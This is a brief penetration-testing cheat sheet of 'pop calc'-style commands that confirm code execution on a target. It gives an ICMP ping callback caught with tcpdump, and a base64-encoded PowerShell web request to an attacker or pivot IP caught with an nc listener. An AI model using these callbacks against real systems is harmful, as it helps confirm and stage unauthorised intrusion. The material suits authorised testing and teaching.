# Pop Calc & Similar commands

## Ping
```bash
# payload
ping <your_ip_address>

# On the attacker or pivot machine
tcpdump -vvv -A -i <INTERFACE> src <TARGET_IP> and icmp
```

## Powershell execution and connection

* [Reference](/Windows/Misc/Base64_encode_powershell_commands/)

```bash
# Payload
echo -n 'Invoke-WebRequest -Uri "http://<ATTACKER_or_PIVOT_IP>:<LISTENING_PORT>"' | iconv -f UTF8 -t UTF16LE | base64 -w 0
# On the attacker or pivot machine
nc -lnvp <LISTENING_PORT>
```

